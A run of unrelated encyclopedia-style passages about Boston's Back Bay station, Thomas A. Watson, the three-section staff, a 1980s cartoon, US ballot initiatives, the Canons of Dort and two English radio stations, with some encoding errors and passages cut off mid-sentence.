threat, a scientist at the Clean Air Task Force, a Boston- based nonprofit pollution research group stated, \\"Honestly, down on the platform it was some of the worst air quality I've measured.\\" Additionally passengers and clerks working in the station have complained. The MBTA said then that it would complete an improved ventilation system by 2012. On October 8, 2014, Amtrak removed its customer service and ticketing agents from the station due to the persistent air quality issues. Back Bay was to be an unstaffed station \\"until further notice\\" as improvements are made. Amtrak personnel returned in 2015, but Amtrak pulled them again effective October 1, 2016. The station has remained unstaffed since then, though two Quik-Trak kiosks are available. However, baggage cannot be checked at the station. Despite being unstaffed, it remains one of the busiest Amtrak stations in the country. In 2018, it was the fourth-busiest Amtrak station in New England (behind South Station, Providence and New Haven Union) and the 16th-busiest nationwide. A $10 million ventilation project, funded equally by MassDOT and Boston Properties, was bid in 2016. The work will improve ventilation at the platform level and add \\"air curtains\\" to prevent exhaust fumes from reaching the concourse. , final designs are due to be submitted in 2020, and the work is expected to take until at least 2022. =Privatization and renovations= Under the agreement signed in 2014, Boston Properties will renovate the station's interior and facade In 2014, Boston Properties (which purchased the adjacent parking garage in 2010) began negotiating with the state for the right to build an air rights development atop the station and garage parcels, in exchange for managing the station and completing a $25 million renovation. Similar private management schemes were already in place at North Station and South Station, though without the real estate component. An agreement was signed in late 2014, with the renovation budget increased to $32 million. In August 2015, the MBTA began paying Boston Properties a subsidy (as rents from retail spaces had been lower than expected) and agreed to fund some repairs to expansion joints not covered in the original agreement. Boston Properties filed notice with the Boston Redevelopment Authority (BRA) in December 2015, beginning the permitting process. Plans for the station and development were released in March 2016. The station renovation will include restoration of the original architecture, relocation of the Orange Line entrances, expanded waiting areas in the main concourse, renovated bathrooms, improved ventilation, and new retail spaces surrounding the concourse. The station work was then scheduled to begin in 2017 pending BRA approval. , construction is planned to begin in 2019. Station layout The waiting room View of station from Berkeley Street overpass, looking westward. From left to right: Tracks 2, 1, 3; Orange Line tracks and train; Tracks 5 and 7. There are 5 tracks serving Amtrak and commuter rail service. Tracks 2, 1, and 3 (in order south to north) serve Amtrak's Acela Express and Northeast Regional plus the MBTA's Providence/Stoughton Line, Franklin Line, and Needham Line. Tracks 5 and 7 on the Framingham/Worcester Line and the Lake Shore Limited serve westbound trains from a separate island platform. Tracks 1 and 2 are considered the primary mainline tracks; the track numbering scheme used in the Boston area uses only odd numbers for additional tracks on the Track 1 side (hence Tracks 3, 5, and 7) and even numbers for tracks on the Track 2 side. The Orange Line tracks and platforms lie between these two groups of mainline rail tracks. The open-air trainshed over the Northeast Corridor platforms Back Bay is fully handicapped accessible. The station has full-length high-level platforms on the three Northeast Corridor tracks, and a mini-high platform for the Worcester Line tracks. Elevators are available to access all platforms from the street-level station building. Because Amtrak's Downeaster trains depart from North Station rather than Back Bay or South Station, Amtrak advises travelers that wish to make a connection via subway to use the Orange Line between Back Bay and North Station, as using South Station would require an additional transfer at Downtown Crossing. The main station building is located between Dartmouth Street and Clarendon Street; however, there are several additional emergency exits from the Amtrak / commuter rail platforms onto Dartmouth Street, Clarendon Street, and Columbus Avenue. The Dartmouth Street Underpass connects the Copley Place shopping mall with the main station building. The underpass was closed from March 6, 2016 to June 1, 2017 during construction at Copley Place, during which it was given some rudimentary refurbishment. =Bus connections= Back Bay is served by three MBTA bus routes: * : ‚ÄìCopley Square * : ‚ÄìBack Bay station * : Waltham Center‚Äì Gallery File:New Haven Railroad stone carving at Back Bay station, April 2016.JPGThis carving on Columbus Avenue is a piece from the demolished 1929 station File:Back Bay Station.jpgStation facade with John Hancock Tower behind File:Back Bay structure.jpgThe main station arcade is supported by massive curved ribs File:Orange Line turnstiles at Back Bay.jpgOrange Line electronic fare gates References External links MBTA ‚Äì Back Bay * Boston Back Bay Amtrak Station (USA RailGuide ‚Äì Train Web) * Library of Congress.

Life and work Watson in his later years, holding Bell's original telephone Born in Salem, Massachusetts, United States Watson was a bookkeeper and a carpenter before he found a job more to his liking in the Charles Williams machine shop in Boston. He was then hired by Alexander Graham Bell, who was then a professor at Boston University. They were known for the invention of the telephone. As the recipient of the first telephone call ‚Äì although coming from just the next room ‚Äì his name became the first words ever said over the phone. \\"Mr. Watson ‚Äì Come here ‚Äì I want to see you,\\" Bell said when first using the new invention, according to Bell's laboratory notebook.. There is some dispute about the actual words used, as Thomas Watson, in his own voice, remembered it as \\"Mr. Watson ‚Äì Come here ‚Äì I want you,\\" in a film made for Bell Labs in 1931 which is referenced below in \\"The Engines of our Ingenuity.\\" Watson resigned from the Bell Telephone Company in 1881 at the age of 27. Using money from his royalties from his participation in the invention of the telephone, Watson first tried his hand at farming. He became a fairly successful traveling Shakespearean actor for a time and then set up his own machine shop. In 1883 Watson founded the Fore River Ship and Engine Building Company. He soon began taking bids for building naval destroyers and by 1901 the Fore River Ship and Engine Company was one of the largest shipyards in America. It would later become one of the major shipyards during World War II, after being purchased by Bethlehem Steel Corporation. On January 25, 1915, Watson was at 333 Grant Avenue in San Francisco to receive the first transcontinental telephone call, placed by Bell from the Telephone Building at 15 Dey Street in New York City. President Woodrow Wilson and the mayors of both cities were also involved in the call.. Thomas Watson was married to Elizabeth Watson. After he died in 1934, she continued to live in Pass-a- Grille during World War II and died in a local hospital in St. Petersburg, Florida in 1949. Watson wrote an autobiography, Exploring Life: The Autobiography of Thomas A. Watson (New York: Appleton, 1926). Late in his life, at the age of 77, upon being impressed with a meeting with Indian spiritual leader Meher Baba in England, Watson was instrumental in helping to arrange for Meher Baba to come to the United States for his first visit there in 1931. Upon meeting Baba, Watson is reported to have said, \\"In my seventy- eight years of life, today is the first time I have experienced what divine love is. I have come to realize this with just a touch from Meher Baba.\\" Later, though, Watson became disenchanted with Baba.. Watson died of heart disease on December 13, 1934 at Pass-Grille Key, Florida. He is buried in the North Weymouth, Massachusetts cemetery. His family grave site sits on top and next to the cemetery road and has a vantage point that looks directly at the former ship yard. He wanted to see his greatest accomplishment in life and death.

The weapon is also known as Ëü†ÈæçÊ£ç panlong gun, \\"coiling dragon staff\\". A more complicated version of the two section staff, the staves can be spun to gather momentum resulting in a powerful strike, or their articulation can be used to strike over or around a shield or other defense. History and use Although there is no historical evidence to support it, a popular modern-day legend states the weapon was made famous by Zhao Kuangyin, the first Emperor of the Song Dynasty (960 AD). Historically made of white oak, waxwood, or Chinese red maple, modern staves are constructed from rattan, bamboo, various hardwoods or aluminum. For optimum fit, each of the three sticks should be about the length of the combatant's arm {usually to } and have a combined diameter that easily fits in the hand {usually about }. These are connected by chains of rings {usually of five inches (127 mm)}; modern versions use ball- and-socket joints. The total length of the weapon is about the same as the Chinese staff (the g√πn), and greater than that of the single staff (known in Japanese as a b≈ç); Its larger size allows for an increased reach compared to the staff. Some of the techniques are similar to that of the staff, so spinning moves over the head and behind the back, such as helicopter spins and neck rolls, can be practised with a regular staff. Other weapon techniques the three-section staff makes use of are similar to that of the pair of sticks used in escrima, a simple short chain, a whip, or the two-section staff. It is therefore advantageous for the user to have some familiarity with these weapons. The three-section staff has the advantage of being usable as a long- range (whip), mid-range (flail or two section staff) or a short-range (pair of escrima) weapon. Acting as an extension of the user's arms, the three-section staff can strike, flail, block, choke, trap, disarm and whip, often with different sections of the staff acting at the same time. The chains or binding ropes of the staff are used to entangle an opponent and their weapons. While it has three ranges, the three-section staff is best used as a short range weapon against longer-ranged weapons. In this configuration, a skilled practitioner can nearly simultaneously block an opponent's strike, trap his or her weapon, and disarm them while executing their own strike with the free end of the staff. While some martial artists have held that the three-section staff was used on the battlefield to entangle horses' legs or to strike around shields, the complexity of the weapon and the length, difficulty of use, lack of sharp tips or edges and other advantages of such traditional battlefield weapons as spears, polearms (such as the yan yue dao), swords and so forth meant that the triple staff was more likely restricted to personal self- defense. One significant weakness of chained weapons in general is a lack of control. At long and intermediate ranges, the strike of a one ends not upon impact but on recoil; even the greatest martial arts masters must use valuable time regaining control of their weapon. Due to the length of the staff sections relative to the length of joining chains, the weapon suffers less from a lack of control than other more flexible chain weapons. In short range mode there are no control issues because the end sections are firmly in hand, and the middle section is unable to move independently. Training with the three-section staff is particularly difficult because it is a multi-mode complex weapon, and is not recommended for beginners. Foam covered versions are now sold to aid in training, but the blows received from the ends on recoil are a relatively rare risk. Instead, the greater danger is the painful impact of the chains or metal parts of the staff that the chains are anchored to upon the hands of the user. This occurs when the staff is improperly used in short range mode and the relative positions of staff sections are rapidly changed, serving as a strong deterrent to casual users. However, motivated self teachers will find the three-section staff and other flexible weapons to be the easiest to learn effectively. This is because flexible weapons provide instant feedback to the user. When used improperly, flexible weapons will either impact upon targets other than those desired, put the user off balance, injure the user, or otherwise be obviously out of control. To experience the versatility of both single-staff and three-section staff, some manufactures have created a combination weapon made out of metal. The three sections, linked by chains as customary for this type of weapon, screw together to form one single staff. The transition to full staff to sectioned staff can be done in mid-combat with a few twists. Against an opponent, the transition is often masked, adding an element of surprise to the following attacks. The ends of three-section staffs sometimes break, but can be replaced with pieces of similar weight and thickness to the other parts. The three-section staff was brought to Okinawa from Fujian Province by Shinko Matayoshi, who incorporated it in Matayoshi Kobudo with two kata (sansetsukon dai ichi, sansetsukon dai ni) after 1935. Kobudo sansetsukon typically have shorter (usually 50‚Äì60 cm.) yet thicker (about 4‚Äì5 cm. in diameter) staffs. The sansetsukon is not to be confused with san bon nunchaku (‰∏âÊú¨„Éå„É≥„ÉÅ„É£„ÇØ).

Clauses in the titles' patents of creation caused the title of Prince of the Moskva to pass to Ney's eldest son, Joseph, and the dukedom of Elchingen to pass to his second son, Michel. This ensured that the two titles would never be held by the same person if there was another heir living, a similar situation to the British titles of Duke of Hamilton and Earl of Selkirk. The two titles were reunited in one person in 1928, and both became extinct with the death of the last heir in 1969.

Comic book artists Jack Kirby and Gil Kane contributed to the design and concepts of the show while Norio Shioyama did the character designs. The series began in 1986 as a five-part mini-series and was followed with a 60-episode series. The series was story edited by Ted Pedersen and written by several authors, including prolific science fiction writers Michael Reaves, Marc Scott Zicree, Larry DiTillio and Gerry Conway. The series theme and soundtrack were composed by Udi Harpaz. There was also a line of tie-in toys by Kenner and a comic book series by DC Comics. The show revolves around the conflict between Doc Terror's cyborgs and the Centurions (a combination of hard-suit and a mecha). Premise In the near future of the 21st century, the cyborg mad scientist Doc Terror seeks to conquer the Earth and turn its inhabitants into robot slaves. He is assisted by his cyborg companion Hacker and an army of robots. There were many types of cyborgs: * Doom Drones Traumatizers ‚Äì The most commonly seen drones are walking robots with laser blasters for arms. The toy for the Traumatizer was a Sears store exclusive. The Traumatizer Leader was colored red. * Doom Drones Strafers ‚Äì A flying robot armed with missiles and lasers. Doc Terror and Hacker are able to fly by swapping their purely robot half for a Strafer. * Groundborgs ‚Äì A land- based robot armed with lasers that moves on treads. No toy was made of Groundborgs. * Cybervore Panther ‚Äì A robot panther. Introduced later in the series. Could combine with the Cybervore Shark. A toy for the Cybervore Panther was designed, but never released. * Cybervore Shark ‚Äì A robot shark. Introduced later in the series. Could combine with the Cybervore Panther. A toy for the Cybervore Shark was designed, but never released. Later, a wheeled Drone with a large screen and cannons as well as a submarine drone were added. They are joined on many occasions, starting with the first episode, by Doc Terror's daughter Amber. At each turn, their evil plans are thwarted by the heroic Centurions. The Centurions are a team of men dressed in specially created exo-frames that allow them (upon shouting \\"PowerXtreme\\") to fuse with 'incredible' assault weapon systems, becoming what the show calls man and machine, Power Xtreme! The end result is a weapons platform somewhere between a hard-suit and a mecha. Originally, there are three Centurions but two other Centurions are later added: Original Team: * Max Ray ‚Äì 'Brilliant' Sea Operations Commander: The calm and collected de facto leader of the team, donning a green exo-frame suit and sporting a fine moustache. His weapon systems are best suited for underwater missions, some of these are as follows:  Cruiser ‚Äì A sea assault weapon system that is used for in and out of water that includes hydro thrusters, a keel-fin radar unit and a missile launcher. Max wears this with a green helmet that matches his exo-frame.  Tidal Blast ‚Äì A powerful surface-sub-surface attack weapon system with two hydro-powered keel-fins used for above and below the water that has battle modes such as cruise, subsonic speed and rear attack. Its weapons include a re-pulsar lesion cannon and two rotating and firing shark missiles. Like Cruiser, Max wears this with a green helmet.  Depth Charger ‚Äì A deep-sea weapon system used for deep underwater missions. It is a mini sub with two pivoting pontoon thrusters and two mobile directional aqua fins that has modes of attack such as diving, full fire and deep sea. Its weapons include two rotating aqua cannons, deep- sea torpedoes and a hydromine.  Sea Bat ‚Äì Released in the second phase of the toys' release. * Jake Rockwell ‚Äì 'Rugged' Land Operations Specialist: Donning a yellow exo-frame suit. A passionate idealist with a strong moral compass, he has a short fuse that often puts him at odds with the cocky and casual personality of Ace. His weapon systems have the most firepower and are best suited for land missions, some of these are as follows:  Fireforce ‚Äì A powerful land assault weapon system that includes twin laser cannons and a rotating plasma re-pulsar. Jake wears this with a yellow helmet that matches his exo-frame.  Wild Weasel ‚Äì A protective armour assault weapon system in the shape of a motorcycle with a head shield and protective back shell for dangerous missions such as heavy forests or rocky terrains. It has battle modes including tracking, anti-aircraft, high speed travel and land attack. Its weapons include two land lasers and a front assault pak module for storing accessories.  Detonator ‚Äì A heavy artillery weapon system for maximum firepower. It has many battle modes including air attack and ground assault. Its weapons include sonic ray guns and freeze ray blasters. Like Fireforce, Jake wears this with a yellow helmet.  Hornet ‚Äì An assault helicopter weapon system used to assist Aerial missions that has battle modes including surveillance, high speed assault and sneak attack. Its weapons include four sidewinder missiles and a rotating freeze cannon.  Swingshot ‚Äì Released in the second phase of the toys' release. * Ace McCloud ‚Äì 'Daring' Air Operations Expert: Donning a blue exo-frame suit, he is a brave but cocky womanizer who is sometimes at odds with Jake. His weapon systems are best suited for aerial missions, some of these are as follows: Skyknight ‚Äì A powerful air assault weapon system that has two turbo thrusters. Its weapons include stinsel missiles, laser cannons and laser bombs. Ace wears this with a blue helmet that matches his exo-frame.  Orbital Interceptor ‚Äì An advanced air weapon assault system with inner atmospheric thrusters that can even be used in space. It has battle modes including cruise, pursuit and power blast. Its weapons include two particle beam deflectors and a particle beam missile. Ace wears this with a life support helmet.  Skybolt ‚Äì An air reinforcement weapon system that has two booster stabiliser pods, radar tracking wings and modular invertible wings with battle modes including reconnaissance, backfire and anti-attack. Its weapons include galactic missiles and two backfire missile launchers for front and rear attacks. Like Skyknight, Ace wears this with a blue helmet.  Strato Strike ‚Äì The toy for Strato Strike was designed, but never released. Extended Team (later additions): * Rex Charger ‚Äì 'Expert' Energy Programmer. Dons a red and pale green exo-frame suit. * John Thunder ‚Äì 'Specialist' Infiltration Commander. Has a black exo-frame with exposed skin. The Centurions are based on an orbiting space station called Sky Vault where its operator, Crystal Kane, uses a transporter to send the Centurions, and the requested weapon systems, to where they are needed. Crystal is always in the company of either Jake Rockwell's dog Shadow or Lucy the orangutan, or in most cases both. Shadow is usually more involved with the Centurions' battles than Lucy and sports a harness with dual missile launchers. Crystal suggests tactics and sends equipment as required. The Centurions also have a hidden base in New York City called \\"Centrum\\". Its entrance is hidden in a book store and must be reached via an underground railcar. \\"Centrum\\" serves as the Centurions' land base of operations and also has a beaming pod for rapid transport to \\"Sky Vault\\". In addition to \\"Sky Vault\\" and \\"Centrum\\" there is also a \\"Centurion Academy\\" whose location is kept completely secret and only seen in the last 5 episodes. Much like the Super Friends' additions of Black Vulcan, Apache Chief, Samurai, and El Dorado to introduce racial diversity into the series, The Centurions saw the addition of Rex Charger, the energy expert, and John Thunder, the Apache infiltration expert. =Themes= As well as the adventure side of the show, the series considered various science fiction themes. In particular, the fusion or relationship between humans and technology is a focus throughout the show's run. A number of episodes also revolved around ecological themes (the 'green issue' was starting to gain respect amongst young people in the mid-to-late 1980s) such as Doc Terror's attempts to extort money from the governments of the world by threatening to destroy some aspect of the environment. The subject of magic is explored in \\"That Old Black Magic\\", when Ace becomes involved with a woman named Cassandra Cross, who is a practitioner of white magic. Her evil twin sister, Lilith, joins forces with Doc Terror in \\"Return of Cassandra\\". Both characters are voiced by B. J. Ward. Ace also has other romantic interests; some of them reappear in later episodes, such as television reporter Jenny Rivers and Sealab technician Mei Lee. Ace's most elusive romantic pursuit is Crystal Kane, who later reveals she had lost a fianc√© in action (\\"You Only Love Twice\\"). Ace has a romantic dream involving Crystal at the beginning of the episode \\"Firecracker\\". Crystal often resists Ace's advances either firmly or jokingly, but sometimes demonstrates she has affection and love for him. The two finally kiss at the conclusion of the two-part story \\"The Better Half\\". Doc Terror is sometimes assisted by his daughter Amber. Like the Batman character Talia al Ghul, she sometimes shows affection for an enemy of her father (Jake Rockwell) and even betrays him when he goes too far (\\"Let the Lightning Fall\\"). The series also sometimes leaves an episode's ending up to viewer interpretation. In the two-part story \\"The Better Half\\", Doc Terror and Hacker's robotic halves, Syntax and Legion, join together after a freak accident and become \\"Uniborg\\"; they turn on the two, forcing Terror and Hacker to ally with the Centurions. Upon breaking into Dominion and defeating their robotic counterparts, Terror is poised to destroy them, when they argue that he cannot kill them because they are his creations, and an extension of himself and Hacker. Terror screams in anguish as he fires his disruptor cannon, and the episode ends with a scene on Skyvault, not revealing whether or not Terror intentionally misses or destroys Uniborg. In \\"To Dare Dominion\\", Terror unleashes a time/space vortex consumer within Dominion that plays havoc with reality. The Centurions are able to destroy it, but not before it wrecks Dominion's power generators, causing a violent explosion that seemingly kills Doc Terror and Hacker. The Centurions are beamed out before they suffer the same fate. Terror and Hacker's fate remains unresolved at the episode's conclusion, with Jake believing that they are finished, and Max arguing that they may not be. The series episodes were produced and broadcast in an anachronistic order. For example, the episodes which showcase the recruitment drive for the two extra Centurions (\\"Man or Machine\\" 5-parter) were produced long after several episodes showcasing the new additions.

Many New England towns still carry on that tradition in the form of open town meetings.  19th Century  Ballot questions became an outlet for solving the difficult questions of the Mid-19th century, including temperence. Except for the states that passed total prohibition of alcohol every state created a version of the local option, which allowed citizens to vote on whether to allow the sale of alcohol in their area. Progressive Era Beginning in 1878, the Progressive Era saw millions of American farmers began banding together to break the post- Civil War, small-farmer indebting crop-lien system with co-operative economics. They were opposed to the arguably corrupt and abusive practices of the national financial sector, and they attempted to improve their circumstances by forming the short-lived People's Party, a viable political party from 1892‚Äì1896, and engaging in populist politics. The party fused with the Democratic Party in the late 1890s, and entirely collapsed by 1909 to the two-party system. Inspired by the efforts of millions of farmers, expos√©s written by investigative journalists (the famous muckrakers), and correlations between special interests' abuses of farmers and special interests' abuses of urban workers, Progressives formed nationally connected citizen organizations to extend this democracy movement. From 1898 to 1918, the Progressives, supported by tens of millions of citizens, forced direct democracy petition components into the constitutions of twenty-six states. = Populist and Labor Movements = William Simon U'Ren , a progressive leader largely responsible for the creation of the Oregon System. The constitutional placement of direct democracy petition components was seen by those citizen majorities as necessary. Given the obvious corruption in state governments, the lack of sovereign public control over the output of state legislatures was seen as \\"the fundamental defect\\" in the nation's legislative machinery. Advocates insisted that the only way to make the founding fathers' vision work was to take the \\"misrepresentation\\" out of representative government with the sovereign people's direct legislation (Special Committee of the National Economic League, 1912). Third parties and national organizations started pressing the issue of direct democracy in the 1890s, and were typically closely tied to other progressive issues like women's suffrage, recall, free silver, the labor movement, and direct election of senators. Labor organizations like the Knights of Labor started using frequent referendums to decide policy at the national level, and several unions like the General Master Workmen voted to support this model of direct legislation in politics. The most notable political party to take up direct legislation was the People's Party, commonly called the populists. The Populists put direct legislation in their in 1896 platform, and they would later that year win 5 Senate seats and 22 House of Representative seats. Nebraska adopted the referendum for municipal governments within its boundaries in 1897. South Dakota was the first state to adopt the referendum, in 1898, patterning its system after that of Switzerland. The adoption of the initiative and referendum in Oregon in 1902 was widely copied and put in the constitutions of western states, and the system was popularly referred to as the \\"Oregon system\\". A leading advocate of direct democracy was William S. U'Ren, who pressed the issue within the Oregon branch of the Populist Party and the Direct Legislation League. However, it was not all successful. Most notably, residents of Texas rejected the referendum because the version put on the ballot by the legislature required 20% of the vote. Other states where the constitutional amendments to place direct democracy failed include Mississippi, Missouri, Wisconsin, and Wyoming. By 1918 enthusiasm waned, and there would be a lull in the expansion of direct democracy for the next 50 years. Florida would adopt the right to the ballot initiative under a new state constitution in 1968, to be applied to constitutional amendments, and Mississippi would adopt a restricted form of initiative process in 1992. Initiative and referendum (I&R;) citizen lawmaking spread across the United States because state legislatures were unresponsive in creating laws that the people needed to protect themselves from lobby groups, laissez-faire economics, and the era's robber barons. Additionally, while legislatures were quick to pass laws benefitting special interests, both legislatures and the courts were inflexible in their refusals to amend, repeal or adjudicate those laws in ways that would eliminate special interest advantages and end abuses of the majority.  Initiative examples  There are many examples of Initiatives and referendums in the United States, for instance: =California= On June 6, 1978 Proposition 13 (a ballot initiative) was enacted by the voters of the State of California. Its passage resulted in a cap on property tax rates in the state, reducing them by an average of 57%. Proposition 13 received an enormous amount of publicity, not only in California, but throughout the United States. Its passage presaged a \\"taxpayer revolt\\" throughout the country. Proposition 13 was officially titled the \\"People's Initiative to Limit Property Taxation.\\" It passed with 65% of voters in favor and 35% against, with 70% of registered voters participating. It was placed on the ballot through the California initiative (or referendum) process under which a proposed law or constitutional amendment, termed a \\"proposition,\\" is placed on the ballot once its backers gather a sufficient number of signatures on a petition. When passed, Proposition 13 became article 13A of the California state constitution. =Massachusetts= Massachusetts passed a similar law, within the initiative petition process in the state, called Proposition 2¬Ω, in 1980, which added a reduction to the auto excise tax rate within Massachusetts, to the idea of the California Proposition 13's type of property tax provision, limiting both levels of taxation to $25.00 per $1,000 of valuation, of the property or vehicle on which such a tax is levied in Massachusetts. =Nevada= In 1990, the civil society of Nevadaan I&R; stateresolved to minimize the intense controversy raging around abortion. The Nevada legislature was under pressure from pro-life organizations to change the state's abortion law. The state's pro-choice organizations wanted the standing law, which conformed to Roe v. Wade, to be left as it was. The pro-choice organizations made use of a seldom-used feature in Nevada's I&R; law. They petitioned for and passed a referendum on an existing state law. It was only the fifth time, since Nevada had gained citizen lawmaking in 1912, that the referendum on an existing state law had been used (Erickson, Questions On The Ballot). Because of the constitutional provisions defining this particular referendum, approval of the state law meant that the legislature is barred from ever amending the law. Only the people can amend such a law in what is called the \\"see us first\\" referendum provision. This initiative process functioned as the safety valve it was designed to be. With an approving majority of over sixty percent, Nevada voters gave a degree of legitimacy to the standing law that no small number of legislators could ever invoke in such a visceral controversy. With the legislature legally taken out of the picture, and the referendum's large legitimacy recognized by both sides, the controversy quickly quieted. The legislature is free to refer proposed statutes or constitutional amendments relating to abortion to the people, but the people are now the decision-makers in this issue. =Nebraska= Citizens in Nebraska, after gaining the constitutional amendment initiative in 1912, used it to reduce their bicameral legislature of 133 members to a unicameral legislature of 43 members in 1934. Effective with the Nebraska legislature's first nonpartisan, unicameral session in 1937, it reduced cost, waste, secrecy and time (no conference committee required), while at the same time making the legislature more efficient and more cooperative with the press and civil society. The success of combining direct democracy governance components with a unicameral legislature has stood the test of time (Nebraska Legislature Online, 2004, The History of Nebraska's Unicameral Legislature). =General components= Direct democracy governance components have contributed significantly to state-level policy and law. Schmidt (1989), Zimmermann (December 1999) and others contend that these contributions have been much more successful than most of direct democracy's critics admit. From a non-legalistic perspective, the Industrial Workers of the World pioneered the archetypal workplace democracy model, the Wobbly Shop, in which the self-managing norms of grassroots democracy were applied. Criticisms Over 60% of initiative activity has occurred in Arizona, California, Colorado, North Dakota, Oregon, and Washington. These states generally have lesser signature requirements than other states. In many states, signature gathering has become a niche industry in the role of politics. Proponents of initiatives, referendums, or recalls now pay individuals to collect signatures. This is required because of the sheer number of signatures required in order to qualify a measure on the ballot. The signature gatherers are usually paid by the signature and often independent contractors, which makes them not subject to minimum wage laws. To combat the growing presence of signature gatherers, some states have passed bans on paying signature gatherers by the signature, and Oregon most notably declared signature gatherers employees and enforced labor laws on the petition proponents. Direct democracy can sometimes be used to subvert the normal checks and balances of a government. For instance, a governor of a state may threaten to use an initiative to \\"go over the heads\\" of an uncooperative legislature. Similarly, a state legislator can collect signatures and place on the ballot a measure that overrules a governor's veto. Because it usually takes a two-thirds majority to overrule a governor's veto, but only a simple majority to pass an initiative, this tactic can sometimes be successful. However, proponents of direct democracy argue that the public acts as an additional check to their elected representatives' power in these cases, not a subversion. More recently, corporations have used the initiative and referendum to force citizen votes on decisions they do not agree with. General Growth Properties collected signatures for a referendum in Glendale, California to stop development of a competing mall next door, developed by competitor Caruso Affiliated, in addition to standard political techniques such as lobbying and filing lawsuits challenging the project's environmental impact report. Ultimately, GGP was unsuccessful at making their case to the voters, and the competing mall was built. Wal-Mart has also used initiatives to bypass planning commissions and city councils to build Wal-Mart Supercenters. Recently, in Inglewood, California, they qualified a ballot measure that described in detail the plans for a Supercenter to be built in the community. Critics decried \\"ballot box planning\\" and the inflexibility of the initiative process, which forbid local government from making any changes to the plans once they were approved by the voters. Ultimately, the initiative was defeated.. Retrieved 2008-07-08. Citizen-written initiatives, like legislative laws, are occasionally subject to unintended consequences. For example, California's \\"Three Strikes\\" proposition intended for violent felons, has sent a number of persons to prison for life for included offenses as small as stealing pizza. However, proponents of Three Strikes argued that such consequences were akin to a \\"lifetime achievement award\\", since a potential third striker would have to have committed two violent and serious felonies beforehand. There have been attempts to change the law, most recently Proposition 66,List of California ballot propositions 2000-present which failed to pass after several loopholes were exploited by opponents of Three Strikes restructuring.

At the time, Dordrecht was often referred to in English as Dort or Dordt. Today the Canons of Dort form part of the Three Forms of Unity, one of the confessional standards of many of the Reformed churches around the world, including the Netherlands, South Africa, Australia, and North America. Their continued use as a standard still forms an unbridgable problem preventing close cooperation between the followers of Jacob Arminius, the Remonstrants, and Dutch Reformed Churches. These canons are in actuality a judicial decision on the doctrinal points in dispute from the Arminian controversy of that day. Following the death of Arminius (1560‚Äì1609), his followers set forth a Remonstrance (published in 1610) in five articles formulating their points of departure from the stricter Calvinism of the Belgic Confession. The canons are the judgment of the Synod against this Remonstrance. Regardless, Arminian theology later received official acceptance by the State and has since continued in various forms within Protestantism, especially within the Methodist churches. The canons were not intended to be a comprehensive explanation of Reformed doctrine, but only an exposition on the five points of doctrine in dispute. The five points of Calvinism, remembered by the mnemonic TULIP and popularized by a 1963 booklet, are popularly said to summarize the Canons of Dort. * . *Chapter 3 of: However there is no historical relationship between them, and some scholars argue that their language distorts the meaning of the canons.

The station is owned & operated by Bauer Radio and forms part of the Hits Radio network. As of February 2020, the station broadcasts from studios outside its broadcast area at Bauer's Manchester headquarters. Overview Rock FM logo used from 2004 to 2015. In 1990, Red Rose Radio, which was transmitted on 97.4 MHz and 999 kHz, was split into two stations - Red Rose Rock FM using the FM frequency and Red Rose Gold on the medium wave frequency. Rock FM was given its name as the station was initially going to be based in Blackpool, Lancashire. However the agreement for the studio premises subsequently fell through and the station remained in Preston. The managing director was Dave Lincoln, with Mark Matthews as programme director, and at that time the station was owned by the Miss World Group, later known as TransWorld Communications (owned by Owen Oyston) and which subsequently became part of Bauer Radio (previously EMAP Radio). The total survey area of the station for RAJAR is broadly defined as western, southern and central Lancashire including parts of Greater Manchester and Merseyside, but the station is audible on FM from Cumbria down into Wales and towards The West Midlands. For over thirty years, Rock FM was based at studios in a converted church (St. Paul's) in Preston. The station consistently rates as the number one commercial radio station in its target service area by reach, share and hours. Over a quarter of all adults in its market listen every week. In January 2020, Bauer announced Rock FM would cease broadcasting from its Preston studios and co-locate with Hits Radio at Bauer's Northern headquarters in Manchester the following month. The station retains local news, advertising and charity staff at offices elsewhere in the city.Bauer moves Rock FM programming to Manchester, RadioToday, 27 January 2020 Programming All of Rock FM's programming is produced and broadcast from Bauer's headquarters in the Castlefield area of Manchester.Rock FM - Public File Local output consists of a weekday breakfast show with Joel Ross from 6-10am, daytime news bulletins and peak-time traffic updates.Hits Radio Network stations drop local weekend programmes, Radio Today, 30 May 2019Bauer to network drivetime across 11 licences in North and Midlands, Radio Today, 5 August 2019 =News= Rock FM broadcasts local news bulletins hourly from 6am-7pm on weekdays, from 7am-1pm on Saturdays and Sundays.

It broadcasts to Teesside, County Durham and North Yorkshire.  History  =Radio Tees= Broadcasting on 257 metres medium wave from the converted Water Board buildings at 74 Dovecot Street, Stockton-on-Tees, Radio Tees was launched at 6am on Tuesday 24 June 1975 by Les Ross. The first record played, appropriately, was \\"Everything's Tuesday\\" by Chairmen of the Board. By the autumn of that year Radio Tees was also broadcasting on 95 VHF, the first local radio station in the area to offer the clarity of FM stereo transmissions.https://www.radiocentre.org/files/music_week_supplement.pdf  Pg4 By the mid-1980s Radio Tees found itself in financial difficulties, and in 1986 its parent company, Sound Broadcasting (Teesside) Ltd, was bought by Metropolitan Broadcasting (or the Metro Radio group as it was known, for it owned Metro Radio in Newcastle upon Tyne). In November that year Radio Tees moved its FM frequency to 96.6 in a direct swap with BBC Radio Cleveland (currently known as BBC Radio Tees). https://www.gazettelive.co.uk/news/charity-party-mark-40-years-8932421 =TFM= In January 1988, 13 years after launch, Radio Tees was rebranded to TFM 96.6 after being taken over by Newcastle upon Tyne-based Metro Radio Group. This relaunch also helped modernise the brand. Shortly after this, in April 1989, its 257 metres, 1170 kHz medium wave frequency was split and this became Great North Radio (GNR). This was launched after broadcasting rules meant TFM could not broadcast on both FM and medium wave. In 1992 TFM vacated its old Dovecot Street studios and moved to new, purpose-built studios in Thornaby-on-Tees. In 1998 Metropolitan Broadcasting was taken over by EMAP; 'TFM' was renamed '96.6 TFM' and brought into EMAP's north of England Independent Local Radio Big City Network.https://radiotoday.co.uk/2007/10/emaps-network-up-and-down/  EMAP's Ups and Downs Retrieved: 3rd September In July 2007, 96.6 TFM was rebranded TFM Radio and re-adopted the slogan 'Today's Favourite Music' which had first been used in the late 1990s. In 2008, EMAP plc was bought by Bauer Media, a privately owned German-based family business, with the radio group being renamed Bauer Place. = Regional Centralising with Metro Radio = TFM logo used from 2013 to 2015 As of Monday 8 April 2013, all programming was shared with sister station Metro Radio in Newcastle. The TFM branding was retained along with separate news bulletins and advertising. Two journalists are based locally for news-gathering in the TFM area. The two stations were able to merge without consultation because both the TFM and Metro licence areas are located in one OFCOM-approved broadcast area (North East England).

